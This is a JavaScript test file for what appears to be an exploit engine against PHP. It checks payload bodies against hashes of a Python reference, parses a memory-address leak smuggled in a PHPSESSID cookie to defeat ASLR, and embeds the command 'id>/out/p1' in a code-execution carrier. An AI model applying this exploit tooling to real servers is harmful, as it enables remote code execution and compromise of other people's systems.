import { createHash } from 'node:crypto'
import { createServer } from 'node:net'
import test from 'node:test'
import assert from 'node:assert/strict'

import {
  a1Body,
  a2Body,
  b1Body,
  b2Body,
  chunkedPost,
  htBytes,
  LEAK_SPEC,
  parseLeak,
  plainPost,
} from '../engine/pure_fixed.js'

const sha = (buf) => createHash('sha256').update(buf).digest('hex')

test('a1 body is byte-identical to the measured Python reference', () => {
  assert.equal(sha(a1Body()), '8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6')
})

test('b1 body is byte-identical to the measured Python reference', () => {
  assert.equal(sha(b1Body(LEAK_SPEC)), 'b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2')
})

test('a2 body is byte-identical to the measured Python reference', () => {
  assert.equal(sha(a2Body()), '4f3ddd8ad9e30ccd96f83856b3128a0c989c23092f905bbf0fb330f2a336481c')
})

test('ht carrier is byte-identical to the measured Python reference', () => {
  const ht = htBytes(0x7f0000000000n, 0x7f0000100000n, 'id>/out/p1')
  assert.equal(sha(ht), '4978e231e8b8809c310fb2f8d92bdffca6546c9e3c25b0d13c9ab91ec8c41cb2')
})

test('b2 body is byte-identical to the measured Python reference', () => {
  const b2 = b2Body(0x7f0000000000n, 0x7f0000100000n, 'id>/out/p1')
  assert.equal(sha(b2), '6b4aa5dc62da57ca43ae5853ec4117e3d44166172d5a259b6b410d01eed103c6')
})

test('parseLeak extracts libphp and a plausible main chunk', () => {
  const dtorOff = 0x65eb60n
  const lib = 0x7f0000000000n
  const main = (lib - 0x1b00000n) & -0x200000n
  const zdtor = lib + dtorOff
  const words = []
  for (let i = 0; i < 2; i += 1) words.push(main)
  for (let i = 0; i < 14; i += 1) words.push(zdtor)
  const raw = Buffer.alloc(words.length * 8)
  words.forEach((w, i) => raw.writeBigUInt64LE(w, i * 8))
  const encoded = [...raw].map((b) => `%${b.toString(16).padStart(2, '0')}`).join('')
  const resp = Buffer.from(`HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=${encoded}\r\n\r\n`)
  const info = parseLeak(resp)
  assert.equal(info.lib, lib)
  assert.equal(info.zdtor, zdtor)
  assert.equal(info.candidates[0], main)
})

async function capture(handler) {
  const server = createServer((socket) => handler(socket))
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve))
  const port = server.address().port
  return { server, port }
}

test('chunkedPost speaks HTTP/1.1 chunked framing', async () => {
  let seen = Buffer.alloc(0)
  const { server, port } = await capture((socket) => {
    socket.on('data', (d) => {
      seen = Buffer.concat([seen, d])
      if (seen.includes('0\r\n\r\n')) {
        socket.end('HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK')
      }
    })
  })
  try {
    const resp = await chunkedPost({ port, path: '/x', body: Buffer.from('abc') })
    assert.ok(resp.includes('200 OK'))
    assert.ok(seen.toString('latin1').includes('Transfer-Encoding: chunked'))
    assert.ok(seen.toString('latin1').includes('3\r\nabc\r\n0\r\n\r\n'))
  } finally {
    server.close()
  }
})

test('plainPost sends Content-Length', async () => {
  let seen = Buffer.alloc(0)
  const { server, port } = await capture((socket) => {
    socket.on('data', (d) => {
      seen = Buffer.concat([seen, d])
      if (seen.includes('abc')) {
        socket.end('HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK')
      }
    })
  })
  try {
    const resp = await plainPost({ port, path: '/x', body: Buffer.from('abc') })
    assert.ok(resp.includes('200 OK'))
    assert.ok(seen.toString('latin1').includes('Content-Length: 3'))
  } finally {
    server.close()
  }
})
